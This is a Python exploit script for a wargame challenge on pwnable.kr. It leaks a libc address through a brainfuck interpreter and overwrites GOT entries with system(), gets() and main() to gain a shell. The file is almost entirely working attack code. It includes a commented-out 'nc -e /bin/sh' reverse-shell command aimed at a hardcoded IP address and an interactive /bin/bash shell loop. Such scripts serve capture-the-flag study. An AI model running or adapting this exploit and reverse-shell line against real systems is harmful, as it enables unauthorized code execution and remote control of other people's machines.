import socket, struct, os, subprocess, sys, time

# Build Payload

# move pointer to got.plt fgets
payload = "<"*(0x0804a0a0 - 0x0804a010)
# read fgets address
payload += ".>"*4 
# move pointer back to got.plt fgets
payload += "<"*4
# write system() to fgets
payload += ",>"*4 
# move pointer to got.plt memset
payload += ">"*((0x0804a02c-0x0804a010)-4)
# write memset to fgets address
payload += ",>"*4
# move to putchar() but already here
# write pointer to main() -0x08048671 
payload += ",>"*4
# call putchar which is now main
payload += "."
payload += "\r\n"



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("pwnable.kr", 9001))

data = ''
while "type" not in data:
	data = s.recv(512)
	print data

print "[*] sending payload"
s.send(payload)

fgets_address = ''
while len(fgets_address) < 4:
	fgets_address += s.recv(512)


fgets_address = struct.unpack("<I", fgets_address)[0]
print "[*] fgets address = 0x%08x" % fgets_address

# from given lib
system_offset = 0x0003f0b0
fgets_offset = 0x00064bc0
gets_offset = 0x00065e90
system_address = fgets_address - (fgets_offset - system_offset)
gets_address = fgets_address + (gets_offset - fgets_offset)
print "[*] system() at 0x%08x" % system_address
print "[*] gets() at 0x%08x" % gets_address

print '[*] overwriting got.plt fget() address with system() address'
s.send(struct.pack("<I", system_address))

print '[*] overwriting got.plt memset with gets() address'
s.send(struct.pack("<I", gets_address))

print '[*] overwriting got.plt putchar with main()-0x08048671'
s.send(struct.pack("<I", 0x08048671))

data = ''
while "type" not in data:
	data = s.recv(512)
	print data

#ip_address = "192.168.0.161"
ip_address = "70.77.162.3"

#s.send("nc -e /bin/sh " + ip_address + " 8888\x00\r\n")

#s.send("/bin/sh -i\x00\r\n")
s.send("/bin/bash\x00\r\n")
s.settimeout(0.5)
while(True):
	try:
		data = s.recv(512)
		sys.stdout.write(data)
	except socket.error:
		s.send(raw_input() + "\n")




